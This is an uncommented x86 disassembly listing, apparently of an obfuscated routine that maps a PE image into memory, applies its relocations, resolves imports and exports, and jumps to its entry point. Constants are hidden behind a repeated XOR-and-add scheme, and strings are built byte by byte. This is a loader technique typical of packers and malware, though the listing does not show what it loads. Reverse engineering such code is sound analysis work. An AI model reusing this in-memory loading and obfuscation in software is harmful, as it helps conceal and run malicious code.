  4266a8:	mov    eax,DWORD PTR [eax+0x1c4]
  4266ae:	push   DWORD PTR [eax]
  4266b0:	mov    eax,DWORD PTR [ebp+0x8]
  4266b3:	mov    eax,DWORD PTR [eax+0x1c0]
  4266b9:	push   DWORD PTR [eax]
  4266bb:	push   DWORD PTR [ebp-0x40]
  4266be:	push   DWORD PTR [ebp-0x24]
  4266c1:	call   0x427158
  4266c6:	mov    DWORD PTR [ebp-0x3c],eax
  4266c9:	mov    eax,DWORD PTR [ebp-0x10]
  4266cc:	mov    ecx,DWORD PTR [ebp-0x24]
  4266cf:	xor    eax,ebx
  4266d1:	add    eax,esi
  4266d3:	cmp    eax,ecx
  4266d5:	je     0x4266f6
  4266d7:	mov    eax,DWORD PTR [ebp+0x8]
  4266da:	mov    ecx,DWORD PTR [ebp-0x50]
  4266dd:	mov    eax,DWORD PTR [eax+0x1e0]
  4266e3:	xor    ecx,ebx
  4266e5:	add    ecx,esi
  4266e7:	push   ecx
  4266e8:	mov    ecx,DWORD PTR [ebp-0x10]
  4266eb:	xor    ecx,ebx
  4266ed:	add    ecx,esi
  4266ef:	push   ecx
  4266f0:	push   DWORD PTR [ebp-0x24]
  4266f3:	call   DWORD PTR [eax+0x18]
  4266f6:	pop    edi
  4266f7:	pop    esi
  4266f8:	pop    ebx
  4266f9:	leave  
  4266fa:	ret    0x4
  4266fd:	push   ebp
  4266fe:	mov    ebp,esp
  426700:	push   ecx
  426701:	push   ecx
  426702:	lea    eax,[ebp-0x8]
  426705:	mov    DWORD PTR [ebp-0x4],eax
  426708:	push   esi
  426709:	mov    esi,DWORD PTR [ebp-0x4]
  42670c:	mov    eax,0xf881ba2f
  426711:	mov    DWORD PTR [esi],eax
  426713:	mov    esi,DWORD PTR [ebp-0x8]
  426716:	cmp    esi,eax
  426718:	pop    esi
  426719:	jne    0x426723
  42671b:	mov    BYTE PTR [ecx+0xa],0x83
  42671f:	mov    BYTE PTR [edx+0x8],0x2e
  426723:	mov    BYTE PTR [edx+0xa],0x83
  426727:	mov    BYTE PTR [ecx+0x2],0x11
  42672b:	leave  
  42672c:	ret    
  42672d:	push   ebp
  42672e:	mov    ebp,esp
  426730:	push   ecx
  426731:	push   ecx
  426732:	lea    eax,[ebp-0x8]
  426735:	mov    DWORD PTR [ebp-0x4],eax
  426738:	mov    edx,DWORD PTR [ebp-0x4]
  42673b:	mov    eax,0xf88b0bc3
  426740:	mov    DWORD PTR [edx],eax
  426742:	mov    edx,DWORD PTR [ebp-0x8]
  426745:	cmp    edx,eax
  426747:	jne    0x426758
  426749:	mov    eax,DWORD PTR [ebp+0x8]
  42674c:	mov    BYTE PTR [ecx+0x9],0xf
  426750:	mov    BYTE PTR [eax+0x7],0x56
  426754:	mov    BYTE PTR [ecx+0x6],0xe
  426758:	mov    BYTE PTR [ecx+0x3],0x1f
  42675c:	leave  
  42675d:	ret    0x4
  426760:	push   ebp
  426761:	mov    ebp,esp
  426763:	push   ecx
  426764:	push   ecx
  426765:	lea    eax,[ebp-0x8]
  426768:	mov    DWORD PTR [ebp-0x4],eax
  42676b:	mov    edx,DWORD PTR [ebp-0x4]
  42676e:	mov    eax,0x7e0da2f
  426773:	mov    DWORD PTR [edx],eax
  426775:	mov    edx,DWORD PTR [ebp-0x8]
  426778:	cmp    edx,eax
  42677a:	jne    0x426780
  42677c:	mov    BYTE PTR [ecx+0x7],0x56
  426780:	mov    eax,DWORD PTR [ebp+0x8]
  426783:	mov    BYTE PTR [ecx+0x1],0x14
  426787:	mov    BYTE PTR [eax+0x9],0x2f
  42678b:	leave  
  42678c:	ret    0x4
  42678f:	push   ebp
  426790:	mov    ebp,esp
  426792:	push   ecx
  426793:	push   ecx
  426794:	lea    eax,[ebp-0x8]
  426797:	mov    DWORD PTR [ebp-0x4],eax
  42679a:	push   esi
  42679b:	mov    esi,DWORD PTR [ebp-0x4]
  42679e:	mov    eax,0x7060e3c
  4267a3:	mov    DWORD PTR [esi],eax
  4267a5:	mov    esi,DWORD PTR [ebp-0x8]
  4267a8:	cmp    esi,eax
  4267aa:	pop    esi
  4267ab:	jne    0x4267b7
  4267ad:	mov    BYTE PTR [edx+0x4],0x12
  4267b1:	mov    WORD PTR [ecx+0x3],0x121f
  4267b7:	mov    BYTE PTR [edx],0x3e
  4267ba:	leave  
  4267bb:	ret    
  4267bc:	push   ebp
  4267bd:	mov    ebp,esp
  4267bf:	push   ecx
  4267c0:	push   ecx
  4267c1:	lea    eax,[ebp-0x8]
  4267c4:	mov    DWORD PTR [ebp-0x4],eax
  4267c7:	mov    edx,DWORD PTR [ebp-0x4]
  4267ca:	mov    eax,0xf8870b3f
  4267cf:	mov    DWORD PTR [edx],eax
  4267d1:	mov    edx,DWORD PTR [ebp-0x8]
  4267d4:	cmp    edx,eax
  4267d6:	jne    0x4267e3
  4267d8:	mov    eax,DWORD PTR [ebp+0x8]
  4267db:	mov    BYTE PTR [ecx+0x8],0xe
  4267df:	mov    BYTE PTR [eax+0x1],0x14
  4267e3:	mov    BYTE PTR [ecx+0x5],0xa
  4267e7:	leave  
  4267e8:	ret    0x4
  4267eb:	push   esi
  4267ec:	mov    ecx,edi
  4267ee:	call   0x4267bc
  4267f3:	mov    edx,edi
  4267f5:	mov    ecx,esi
  4267f7:	mov    BYTE PTR [esi],0x1e
  4267fa:	call   0x42678f
  4267ff:	push   esi
  426800:	mov    ecx,edi
  426802:	mov    BYTE PTR [esi+0x5],0xa
  426806:	call   0x426760
  42680b:	push   esi
  42680c:	mov    BYTE PTR [esi+0x6],0xe
  426810:	call   0x42672d
  426815:	mov    BYTE PTR [esi+0x2],0x11
  426819:	mov    edx,esi
  42681b:	jmp    0x4266fd
  426820:	push   ebp
  426821:	mov    ebp,esp
  426823:	push   ecx
  426824:	mov    ecx,DWORD PTR [edx+0x194]
  42682a:	push   esi
  42682b:	mov    esi,DWORD PTR [ebp+0x8]
  42682e:	mov    esi,DWORD PTR [esi]
  426830:	mov    DWORD PTR [ecx],esi
  426832:	mov    ecx,DWORD PTR [edx+0x194]
  426838:	mov    ecx,DWORD PTR [ecx]
  42683a:	mov    esi,DWORD PTR [edx+0x190]
  426840:	mov    DWORD PTR [esi],ecx
  426842:	mov    eax,DWORD PTR [edx+0x194]
  426848:	mov    ecx,DWORD PTR [eax]
  42684a:	mov    ecx,DWORD PTR [ecx+0x3c]
  42684d:	add    ecx,DWORD PTR [eax]
  42684f:	mov    DWORD PTR [ebp-0x4],0xf89ca5a5
  426856:	mov    eax,DWORD PTR [ebp-0x4]
  426859:	movzx  ecx,WORD PTR [ecx+0x16]
  42685d:	xor    eax,0x75108aa
  426862:	add    eax,0x3272f1
  426867:	pop    esi
  426868:	test   ecx,eax
  42686a:	je     0x426878
  42686c:	mov    eax,DWORD PTR [edx+0x1c8]
  426872:	mov    DWORD PTR [eax],0xf89c85ba
  426878:	leave  
  426879:	ret    0x4
  42687c:	push   ebp
  42687d:	mov    ebp,esp
  42687f:	sub    esp,0x70
  426882:	and    DWORD PTR [ebp-0x20],0x0
  426886:	mov    DWORD PTR [ebp-0x18],0xf89cb5a5
  42688d:	mov    DWORD PTR [ebp-0x1c],0xf89c85e5
  426894:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  42689b:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  4268a2:	mov    DWORD PTR [ebp-0x2c],0xf89f05a5
  4268a9:	mov    eax,DWORD PTR [ebp+0x20]
  4268ac:	mov    eax,DWORD PTR [eax+0x194]
  4268b2:	mov    DWORD PTR [ebp-0xc],eax
  4268b5:	mov    eax,DWORD PTR [ebp+0x20]
  4268b8:	push   ebx
  4268b9:	push   esi
  4268ba:	mov    esi,DWORD PTR [eax+0x190]
  4268c0:	mov    eax,DWORD PTR [ebp+0x20]
  4268c3:	mov    eax,DWORD PTR [eax+0x18c]
  4268c9:	mov    DWORD PTR [ebp-0x8],eax
  4268cc:	mov    eax,DWORD PTR [eax]
  4268ce:	push   edi
  4268cf:	mov    DWORD PTR [ebp-0x4],esi
  4268d2:	test   eax,eax
  4268d4:	jne    0x4268e1
  4268d6:	push   DWORD PTR [ebp+0x1c]
  4268d9:	mov    edx,DWORD PTR [ebp+0x20]
  4268dc:	call   0x426820
  4268e1:	mov    eax,DWORD PTR [esi]
  4268e3:	mov    ebx,DWORD PTR [esi]
  4268e5:	add    ebx,DWORD PTR [eax+0x3c]
  4268e8:	mov    eax,DWORD PTR [ebp+0xc]
  4268eb:	mov    ecx,DWORD PTR [ebp-0x8]
  4268ee:	mov    ecx,DWORD PTR [ecx]
  4268f0:	mov    esi,0x75108aa
  4268f5:	xor    eax,esi
  4268f7:	mov    edi,0x3272f1
  4268fc:	add    eax,edi
  4268fe:	cmp    eax,ecx
  426900:	jne    0x426b38
  426906:	mov    eax,DWORD PTR [ebp-0xc]
  426909:	mov    eax,DWORD PTR [eax]
  42690b:	mov    DWORD PTR [ebp-0x10],eax
  42690e:	mov    eax,DWORD PTR [ebx+0x50]
  426911:	mov    DWORD PTR [ebp-0x68],eax
  426914:	mov    eax,DWORD PTR [ebp-0x18]
  426917:	xor    eax,esi
  426919:	add    eax,edi
  42691b:	mov    DWORD PTR [ebp-0x64],eax
  42691e:	mov    eax,DWORD PTR [ebp-0x14]
  426921:	and    DWORD PTR [ebp-0x6c],0x0
  426925:	xor    eax,esi
  426927:	add    eax,edi
  426929:	mov    DWORD PTR [ebp-0x60],eax
  42692c:	lea    eax,[ebp-0x70]
  42692f:	push   eax
  426930:	mov    eax,DWORD PTR [ebp+0x8]
  426933:	xor    eax,esi
  426935:	add    eax,edi
  426937:	push   eax
  426938:	mov    eax,DWORD PTR [ebp+0x20]
  42693b:	add    eax,0xaa
  426940:	push   eax
  426941:	mov    eax,DWORD PTR [ebp+0x20]
  426944:	mov    eax,DWORD PTR [eax+0x198]
  42694a:	mov    DWORD PTR [ebp-0x70],0x4
  426951:	push   DWORD PTR [eax]
  426953:	mov    eax,DWORD PTR [ebp+0x10]
  426956:	call   eax
  426958:	mov    ecx,DWORD PTR [ebp-0xc]
  42695b:	mov    ecx,DWORD PTR [ecx]
  42695d:	mov    edx,DWORD PTR [ebp-0x8]
  426960:	mov    DWORD PTR [ebp-0x6c],eax
  426963:	mov    DWORD PTR [ebp+0x1c],eax
  426966:	mov    DWORD PTR [edx],ecx
  426968:	mov    ecx,DWORD PTR [ebp-0x4]
  42696b:	mov    DWORD PTR [ecx],eax
  42696d:	mov    eax,DWORD PTR [ebx+0x50]
  426970:	mov    DWORD PTR [ebp-0x68],eax
  426973:	mov    eax,DWORD PTR [ebp-0x1c]
  426976:	xor    eax,esi
  426978:	add    eax,edi
  42697a:	mov    DWORD PTR [ebp-0x64],eax
  42697d:	lea    eax,[ebp-0x20]
  426980:	mov    DWORD PTR [ebp-0x60],eax
  426983:	lea    eax,[ebp-0x70]
  426986:	push   eax
  426987:	mov    eax,DWORD PTR [ebp+0x8]
  42698a:	xor    eax,esi
  42698c:	add    eax,edi
  42698e:	push   eax
  42698f:	mov    eax,DWORD PTR [ebp+0x20]
  426992:	add    eax,0xee
  426997:	push   eax
  426998:	mov    eax,DWORD PTR [ebp+0x20]
  42699b:	mov    eax,DWORD PTR [eax+0x198]
  4269a1:	mov    DWORD PTR [ebp-0x70],0x4
  4269a8:	push   DWORD PTR [eax]
  4269aa:	mov    eax,DWORD PTR [ebp+0x10]
  4269ad:	call   eax
  4269af:	test   eax,eax
  4269b1:	je     0x4269d6
  4269b3:	and    DWORD PTR [ebp+0xc],0x0
  4269b7:	cmp    DWORD PTR [ebx+0x50],0x0
  4269bb:	jbe    0x4269d6
  4269bd:	mov    eax,DWORD PTR [ebp+0x1c]
  4269c0:	mov    ecx,DWORD PTR [ebp-0x10]
  4269c3:	sub    ecx,eax
  4269c5:	mov    dl,BYTE PTR [ecx+eax*1]
  4269c8:	inc    DWORD PTR [ebp+0xc]
  4269cb:	mov    BYTE PTR [eax],dl
  4269cd:	mov    edx,DWORD PTR [ebp+0xc]
  4269d0:	inc    eax
  4269d1:	cmp    edx,DWORD PTR [ebx+0x50]
  4269d4:	jb     0x4269c5
  4269d6:	mov    edx,DWORD PTR [ebp+0x1c]
  4269d9:	mov    ecx,DWORD PTR [edx+0x3c]
  4269dc:	add    ecx,edx
  4269de:	mov    eax,DWORD PTR [ecx+0xa0]
  4269e4:	mov    ebx,DWORD PTR [ecx+0x28]
  4269e7:	add    eax,edx
  4269e9:	sub    edx,DWORD PTR [ebp-0x10]
  4269ec:	add    ebx,DWORD PTR [ebp+0x1c]
  4269ef:	mov    DWORD PTR [ebp+0xc],edx
  4269f2:	mov    DWORD PTR [ebp-0x2c],ecx
  4269f5:	mov    DWORD PTR [ebp-0x14],ebx
  4269f8:	mov    DWORD PTR [ebp-0x8],0x0
  4269ff:	jmp    0x426a7b
  426a01:	add    edx,0xfffffff8
  426a04:	shr    edx,1
  426a06:	mov    DWORD PTR [ebp-0x18],edx
  426a09:	je     0x426a67
  426a0b:	lea    edx,[eax+0x8]
  426a0e:	mov    DWORD PTR [ebp-0x4],edx
  426a11:	mov    edx,DWORD PTR [ebp-0x18]
  426a14:	mov    DWORD PTR [ebp-0x18],edx
  426a17:	mov    edx,DWORD PTR [ebp-0x4]
  426a1a:	movzx  edx,WORD PTR [edx]
  426a1d:	mov    DWORD PTR [ebp-0x24],edx
  426a20:	and    edx,0xfff
  426a26:	mov    DWORD PTR [ebp-0x28],edx
  426a29:	mov    edx,DWORD PTR [ebp-0x24]
  426a2c:	shr    edx,0xc
  426a2f:	add    edx,0xffcd8d0f
  426a35:	xor    edx,esi
  426a37:	cmp    edx,0xf89c85b8
  426a3d:	jne    0x426a5e
  426a3f:	mov    edx,DWORD PTR [ebp-0x28]
  426a42:	add    edx,DWORD PTR [ebp+0x1c]
  426a45:	mov    ebx,DWORD PTR [eax]
  426a47:	cmp    DWORD PTR [ebx+edx*1],0x0
  426a4b:	je     0x426a5b
  426a4d:	mov    ecx,DWORD PTR [ebp+0xc]
  426a50:	add    ecx,DWORD PTR [ebx+edx*1]
  426a53:	mov    ebx,DWORD PTR [eax]
  426a55:	mov    DWORD PTR [edx+ebx*1],ecx
  426a58:	mov    ecx,DWORD PTR [ebp-0x2c]
  426a5b:	mov    ebx,DWORD PTR [ebp-0x14]
  426a5e:	add    DWORD PTR [ebp-0x4],0x2
  426a62:	dec    DWORD PTR [ebp-0x18]
  426a65:	jne    0x426a17
  426a67:	mov    edx,DWORD PTR [ebp-0xc]
  426a6a:	add    DWORD PTR [ebp-0x8],edx
  426a6d:	mov    edx,DWORD PTR [ebp-0x8]
  426a70:	cmp    edx,DWORD PTR [ecx+0xa4]
  426a76:	jae    0x426a89
  426a78:	add    eax,DWORD PTR [ebp-0xc]
  426a7b:	mov    edx,DWORD PTR [eax+0x4]
  426a7e:	mov    DWORD PTR [ebp-0xc],edx
  426a81:	test   edx,edx
  426a83:	jne    0x426a01
  426a89:	mov    eax,DWORD PTR [ebp-0x10]
  426a8c:	mov    DWORD PTR [ebp-0x6c],eax
  426a8f:	mov    DWORD PTR [ebp-0x70],0x4
  426a96:	mov    eax,DWORD PTR [ecx+0x50]
  426a99:	mov    DWORD PTR [ebp-0x68],eax
  426a9c:	mov    eax,DWORD PTR [ebp-0x1c]
  426a9f:	xor    eax,esi
  426aa1:	add    eax,edi
  426aa3:	mov    DWORD PTR [ebp-0x64],eax
  426aa6:	lea    eax,[ebp-0x20]
  426aa9:	mov    DWORD PTR [ebp-0x60],eax
  426aac:	lea    eax,[ebp-0x70]
  426aaf:	push   eax
  426ab0:	mov    eax,DWORD PTR [ebp+0x8]
  426ab3:	xor    eax,esi
  426ab5:	add    eax,edi
  426ab7:	push   eax
  426ab8:	mov    eax,DWORD PTR [ebp+0x20]
  426abb:	add    eax,0xee
  426ac0:	push   eax
  426ac1:	mov    eax,DWORD PTR [ebp+0x20]
  426ac4:	mov    eax,DWORD PTR [eax+0x198]
  426aca:	push   DWORD PTR [eax]
  426acc:	mov    eax,DWORD PTR [ebp+0x10]
  426acf:	call   eax
  426ad1:	mov    eax,DWORD PTR [ebp+0x20]
  426ad4:	mov    eax,DWORD PTR [eax+0x180]
  426ada:	add    eax,DWORD PTR [ebp+0xc]
  426add:	mov    ecx,DWORD PTR [ebp+0xc]
  426ae0:	push   DWORD PTR [ebp+0x18]
  426ae3:	mov    DWORD PTR [eax],ecx
  426ae5:	push   DWORD PTR [ebp+0x14]
  426ae8:	push   DWORD PTR [ebp+0x1c]
  426aeb:	call   ebx
  426aed:	mov    ecx,DWORD PTR [ebp+0xc]
  426af0:	add    ecx,DWORD PTR [ebp+0x20]
  426af3:	lea    eax,[ebp+0x4]
  426af6:	mov    DWORD PTR [ebp+0x20],ecx
  426af9:	mov    ecx,DWORD PTR [ebp+0x20]
  426afc:	mov    ecx,DWORD PTR [ebp+0x20]
  426aff:	mov    edx,DWORD PTR [ecx+0x190]
  426b05:	mov    ecx,DWORD PTR [ebp+0x20]
  426b08:	mov    ecx,DWORD PTR [ecx+0x18c]
  426b0e:	mov    esi,DWORD PTR [ecx]
  426b10:	cmp    DWORD PTR [eax],esi
  426b12:	jb     0x426b33
  426b14:	mov    esi,DWORD PTR [edx]
  426b16:	mov    edi,DWORD PTR [edx]
  426b18:	mov    esi,DWORD PTR [esi+0x3c]
  426b1b:	lea    esi,[edi+esi*1+0x50]
  426b1f:	mov    edi,DWORD PTR [ecx]
  426b21:	add    edi,DWORD PTR [esi]
  426b23:	cmp    DWORD PTR [eax],edi
  426b25:	jae    0x426b33
  426b27:	mov    esi,DWORD PTR [ecx]
  426b29:	mov    ecx,DWORD PTR [eax]
  426b2b:	mov    edx,DWORD PTR [edx]
  426b2d:	sub    ecx,esi
  426b2f:	add    edx,ecx
  426b31:	mov    DWORD PTR [eax],edx
  426b33:	mov    eax,DWORD PTR [ebp+0xc]
  426b36:	jmp    0x426b3a
  426b38:	xor    eax,eax
  426b3a:	pop    edi
  426b3b:	pop    esi
  426b3c:	pop    ebx
  426b3d:	leave  
  426b3e:	ret    0x1c
  426b41:	push   ebp
  426b42:	mov    ebp,esp
  426b44:	sub    esp,0x1c
  426b47:	push   esi
  426b48:	mov    esi,eax
  426b4a:	mov    eax,DWORD PTR [ecx+0x190]
  426b50:	cmp    DWORD PTR [eax],0x0
  426b53:	je     0x426c63
  426b59:	test   edx,edx
  426b5b:	je     0x426c63
  426b61:	test   esi,esi
  426b63:	je     0x426c63
  426b69:	mov    eax,DWORD PTR [esi+0x88]
  426b6f:	test   eax,eax
  426b71:	je     0x426c5e
  426b77:	cmp    DWORD PTR [esi+0x8c],0x10
  426b7e:	je     0x426c5e
  426b84:	cmp    DWORD PTR [esi+0x34],edx
  426b87:	je     0x426c5e
  426b8d:	mov    esi,DWORD PTR [ecx+0x18c]
  426b93:	and    DWORD PTR [ebp-0x10],0x0
  426b97:	mov    ecx,edx
  426b99:	sub    ecx,DWORD PTR [esi]
  426b9b:	add    eax,edx
  426b9d:	movzx  edx,WORD PTR [eax+0xc]
  426ba1:	mov    DWORD PTR [ebp-0x1c],ecx
  426ba4:	movzx  ecx,WORD PTR [eax+0xe]
  426ba8:	add    ecx,edx
  426baa:	je     0x426c5e
  426bb0:	lea    ecx,[eax+0x14]
  426bb3:	push   ebx
  426bb4:	mov    DWORD PTR [ebp-0x18],ecx
  426bb7:	mov    esi,0x7fffffff
  426bbc:	push   edi
  426bbd:	test   DWORD PTR [ecx],esi
  426bbf:	je     0x426c40
  426bc1:	mov    edx,DWORD PTR [ecx]
  426bc3:	and    DWORD PTR [ebp-0xc],0x0
  426bc7:	and    edx,esi
  426bc9:	add    edx,eax
  426bcb:	movzx  edi,WORD PTR [edx+0xe]
  426bcf:	movzx  ebx,WORD PTR [edx+0xc]
  426bd3:	add    edi,ebx
  426bd5:	je     0x426c40
  426bd7:	lea    ecx,[edx+0x14]
  426bda:	mov    DWORD PTR [ebp-0x14],ecx
  426bdd:	test   DWORD PTR [ecx],esi
  426bdf:	je     0x426c22
  426be1:	mov    ecx,DWORD PTR [ecx]
  426be3:	and    DWORD PTR [ebp-0x8],0x0
  426be7:	and    ecx,esi
  426be9:	add    ecx,eax
  426beb:	movzx  edi,WORD PTR [ecx+0xe]
  426bef:	movzx  ebx,WORD PTR [ecx+0xc]
  426bf3:	add    edi,ebx
  426bf5:	je     0x426c22
  426bf7:	lea    edi,[ecx+0x14]
  426bfa:	mov    DWORD PTR [ebp-0x4],edi
  426bfd:	mov    edi,DWORD PTR [ebp-0x4]
  426c00:	mov    edi,DWORD PTR [edi]
  426c02:	test   edi,edi
  426c04:	je     0x426c0c
  426c06:	mov    ebx,DWORD PTR [ebp-0x1c]
  426c09:	add    DWORD PTR [edi+eax*1],ebx
  426c0c:	movzx  edi,WORD PTR [ecx+0xe]
  426c10:	movzx  ebx,WORD PTR [ecx+0xc]
  426c14:	inc    DWORD PTR [ebp-0x8]
  426c17:	add    DWORD PTR [ebp-0x4],0x8
  426c1b:	add    edi,ebx
  426c1d:	cmp    DWORD PTR [ebp-0x8],edi
  426c20:	jb     0x426bfd
  426c22:	movzx  edi,WORD PTR [edx+0xe]
  426c26:	movzx  ebx,WORD PTR [edx+0xc]
  426c2a:	mov    ecx,DWORD PTR [ebp-0x14]
  426c2d:	inc    DWORD PTR [ebp-0xc]
  426c30:	add    ecx,0x8
  426c33:	add    edi,ebx
  426c35:	mov    DWORD PTR [ebp-0x14],ecx
  426c38:	cmp    DWORD PTR [ebp-0xc],edi
  426c3b:	jb     0x426bdd
  426c3d:	mov    ecx,DWORD PTR [ebp-0x18]
  426c40:	movzx  edx,WORD PTR [eax+0xe]
  426c44:	movzx  edi,WORD PTR [eax+0xc]
  426c48:	inc    DWORD PTR [ebp-0x10]
  426c4b:	add    ecx,0x8
  426c4e:	add    edx,edi
  426c50:	mov    DWORD PTR [ebp-0x18],ecx
  426c53:	cmp    DWORD PTR [ebp-0x10],edx
  426c56:	jb     0x426bbd
  426c5c:	pop    edi
  426c5d:	pop    ebx
  426c5e:	xor    eax,eax
  426c60:	inc    eax
  426c61:	jmp    0x426c65
  426c63:	xor    eax,eax
  426c65:	pop    esi
  426c66:	leave  
  426c67:	ret    
  426c68:	push   ebp
  426c69:	mov    ebp,esp
  426c6b:	mov    ecx,DWORD PTR [ecx+0x190]
  426c71:	mov    eax,DWORD PTR [ebp+0xc]
  426c74:	sub    esp,0x10
  426c77:	push   ebx
  426c78:	xor    ebx,ebx
  426c7a:	push   esi
  426c7b:	push   edi
  426c7c:	cmp    DWORD PTR [ecx],ebx
  426c7e:	je     0x426d06
  426c84:	cmp    eax,ebx
  426c86:	je     0x426d06
  426c88:	cmp    DWORD PTR [eax+0x78],ebx
  426c8b:	jne    0x426c92
  426c8d:	xor    eax,eax
  426c8f:	inc    eax
  426c90:	jmp    0x426d08
  426c92:	mov    eax,DWORD PTR [eax+0x78]
  426c95:	add    eax,DWORD PTR [ebp+0x8]
  426c98:	mov    ecx,DWORD PTR [eax+0x1c]
  426c9b:	mov    edx,DWORD PTR [eax+0x24]
  426c9e:	mov    esi,DWORD PTR [eax+0x14]
  426ca1:	mov    edi,DWORD PTR [eax+0x18]
  426ca4:	add    ecx,DWORD PTR [ebp+0x8]
  426ca7:	add    edx,DWORD PTR [ebp+0x8]
  426caa:	mov    DWORD PTR [ebp-0x4],esi
  426cad:	cmp    esi,edi
  426caf:	ja     0x426cb4
  426cb1:	mov    DWORD PTR [ebp-0x4],edi
  426cb4:	mov    DWORD PTR [ebp-0x8],ebx
  426cb7:	cmp    DWORD PTR [ebp-0x4],ebx
  426cba:	jbe    0x426c8d
  426cbc:	cmp    ebx,DWORD PTR [eax+0x14]
  426cbf:	jae    0x426cc7
  426cc1:	movzx  esi,WORD PTR [edx+ebx*2]
  426cc5:	jmp    0x426cc9
  426cc7:	mov    esi,ebx
  426cc9:	lea    esi,[ecx+esi*4]
  426ccc:	mov    edi,DWORD PTR [esi]
  426cce:	test   edi,edi
  426cd0:	je     0x426cfb
  426cd2:	add    edi,DWORD PTR [ebp+0x8]
  426cd5:	mov    DWORD PTR [ebp-0x10],edi
  426cd8:	cmp    edi,eax
  426cda:	jbe    0x426cec
  426cdc:	mov    ebx,DWORD PTR [ebp+0xc]
  426cdf:	mov    ebx,DWORD PTR [ebx+0x7c]
  426ce2:	add    ebx,eax
  426ce4:	cmp    edi,ebx
  426ce6:	jae    0x426cec
  426ce8:	mov    esi,DWORD PTR [esi]
  426cea:	jmp    0x426cf4
  426cec:	sub    edi,DWORD PTR [ebp+0x8]
  426cef:	mov    DWORD PTR [esi],edi
  426cf1:	mov    esi,DWORD PTR [ebp-0x10]
  426cf4:	test   esi,esi
  426cf6:	je     0x426d06
  426cf8:	mov    ebx,DWORD PTR [ebp-0x8]
  426cfb:	inc    ebx
  426cfc:	mov    DWORD PTR [ebp-0x8],ebx
  426cff:	cmp    ebx,DWORD PTR [ebp-0x4]
  426d02:	jb     0x426cbc
  426d04:	jmp    0x426c8d
  426d06:	xor    eax,eax
  426d08:	pop    edi
  426d09:	pop    esi
  426d0a:	pop    ebx
  426d0b:	leave  
  426d0c:	ret    0x8
  426d0f:	push   ebp
  426d10:	mov    ebp,esp
  426d12:	sub    esp,0x2c
  426d15:	mov    edx,0xf89c85a5
  426d1a:	mov    DWORD PTR [ebp-0x4],edx
  426d1d:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  426d24:	mov    eax,DWORD PTR [ebp-0x4]
  426d27:	mov    ecx,DWORD PTR [ebp-0x4]
  426d2a:	mov    ecx,DWORD PTR [ebp-0x4]
  426d2d:	mov    ecx,DWORD PTR [ebp-0x4]
  426d30:	mov    ecx,DWORD PTR [ebp-0x4]
  426d33:	mov    ecx,DWORD PTR [ebp-0x4]
  426d36:	push   ebx
  426d37:	mov    ebx,DWORD PTR [ebp+0x10]
  426d3a:	push   esi
  426d3b:	mov    esi,0x75108aa
  426d40:	mov    DWORD PTR [ebp-0x10],0x352eb2f
  426d47:	mov    ecx,DWORD PTR [ebp-0x4]
  426d4a:	mov    ebx,DWORD PTR [ebx+0x190]
  426d50:	push   edi
  426d51:	mov    edi,0x3272f1
  426d56:	xor    ecx,esi
  426d58:	xor    eax,esi
  426d5a:	add    eax,edi
  426d5c:	add    ecx,edi
  426d5e:	mov    DWORD PTR [ebp-0x18],eax
  426d61:	cmp    ecx,DWORD PTR [ebx]
  426d63:	je     0x426fe4
  426d69:	mov    ebx,DWORD PTR [ebp-0x4]
  426d6c:	mov    ecx,DWORD PTR [ebp+0xc]
  426d6f:	xor    ebx,esi
  426d71:	add    ebx,edi
  426d73:	cmp    ebx,ecx
  426d75:	je     0x426fe4
  426d7b:	mov    ebx,DWORD PTR [ebp-0x4]
  426d7e:	mov    ecx,DWORD PTR [ecx+0x80]
  426d84:	xor    ebx,esi
  426d86:	add    ebx,edi
  426d88:	cmp    ecx,ebx
  426d8a:	je     0x426fdf
  426d90:	add    ecx,DWORD PTR [ebp+0x8]
  426d93:	mov    DWORD PTR [ebp-0x2c],ecx
  426d96:	mov    ebx,edx
  426d98:	xor    ebx,esi
  426d9a:	add    ebx,edi
  426d9c:	mov    DWORD PTR [ebp-0x10],ebx
  426d9f:	mov    ebx,DWORD PTR [ebp-0x10]
  426da2:	cmp    ebx,edx
  426da4:	je     0x426db8
  426da6:	mov    edx,DWORD PTR [ebp-0x10]
  426da9:	mov    ebx,DWORD PTR [ebp-0x4]
  426dac:	imul   edx,edx,0x14
  426daf:	xor    ebx,esi
  426db1:	add    ebx,edi
  426db3:	cmp    DWORD PTR [edx+ecx*1],ebx
  426db6:	jne    0x426dcf
  426db8:	mov    edx,DWORD PTR [ebp-0x10]
  426dbb:	mov    ebx,DWORD PTR [ebp-0x4]
  426dbe:	imul   edx,edx,0x14
  426dc1:	xor    ebx,esi
  426dc3:	add    ebx,edi
  426dc5:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  426dc9:	je     0x426fd1
  426dcf:	mov    eax,DWORD PTR [ebp-0x4]
  426dd2:	mov    ebx,DWORD PTR [ebp-0x4]
  426dd5:	mov    eax,DWORD PTR [ebp-0x10]
  426dd8:	imul   eax,eax,0x14
  426ddb:	add    eax,ecx
  426ddd:	mov    ecx,DWORD PTR [eax+0x10]
  426de0:	add    ecx,DWORD PTR [ebp+0x8]
  426de3:	xor    ebx,esi
  426de5:	mov    DWORD PTR [ebp-0x1c],ecx
  426de8:	mov    ecx,DWORD PTR [ebp-0x4]
  426deb:	mov    edx,DWORD PTR [ebp-0x4]
  426dee:	xor    ecx,esi
  426df0:	add    ecx,edi
  426df2:	xor    edx,esi
  426df4:	mov    DWORD PTR [ebp-0x24],ecx
  426df7:	mov    ecx,DWORD PTR [eax]
  426df9:	add    edx,edi
  426dfb:	add    ebx,edi
  426dfd:	cmp    ecx,edx
  426dff:	je     0x426e07
  426e01:	add    ecx,DWORD PTR [ebp+0x8]
  426e04:	mov    DWORD PTR [ebp-0x24],ecx
  426e07:	mov    ecx,DWORD PTR [ebp-0x4]
  426e0a:	xor    ecx,esi
  426e0c:	add    ecx,DWORD PTR [eax+0xc]
  426e0f:	mov    eax,DWORD PTR [ebp+0x8]
  426e12:	lea    eax,[ecx+eax*1+0x3272f1]
  426e19:	mov    DWORD PTR [ebp+0xc],eax
  426e1c:	mov    DWORD PTR [ebp-0x28],0xf89c85be
  426e23:	mov    eax,DWORD PTR [ebp+0x10]
  426e26:	push   DWORD PTR [ebp+0xc]
  426e29:	mov    eax,DWORD PTR [eax+0x1e0]
  426e2f:	call   DWORD PTR [eax]
  426e31:	mov    ecx,DWORD PTR [ebp-0x4]
  426e34:	xor    ecx,esi
  426e36:	add    ecx,edi
  426e38:	mov    DWORD PTR [ebp-0xc],eax
